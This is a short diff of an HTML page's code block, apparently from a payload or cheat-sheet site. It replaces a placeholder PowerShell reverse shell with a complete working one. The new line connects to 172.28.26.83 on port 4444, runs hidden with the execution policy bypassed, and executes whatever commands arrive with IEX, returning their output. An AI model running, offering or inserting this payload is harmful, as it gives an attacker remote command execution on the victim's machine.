@@ -59,7 +59,7 @@
             <!-- Code Content Area -->
             <pre class="p-4 overflow-x-auto text-sm leading-relaxed font-mono">
 <code class="text-white">
-<span class="text-cyan-400">powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient('<192.168.1.57>',<4444>);$stream=$client.GetStream();[byte[]]$buffer=0..65535|%{0};while(($i=$stream.Read($buffer,0,$buffer.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);$send=(iex $data 2>&1 | Out-String );$send2=$send + 'PS ' + (pwd).Path + '> ';$bytes=([text.encoding]::ASCII).GetBytes($send2);$stream.Write($bytes,0,$bytes.Length);$stream.Flush()};$client.Close()"
+<span class="text-cyan-400">powershell -NoP -NonI -W Hidden -Exec Bypass $e=New-Object System.Net.Sockets.TcpClient('172.28.26.83',4444);$s=$e.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(IEX $d 2>&1 | Out-String );$sb2=$sb+'PS '+$pwd.Path+'> ';$b2=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($b2,0,$b2.Length);$s.Flush()}
 </span>
 
 
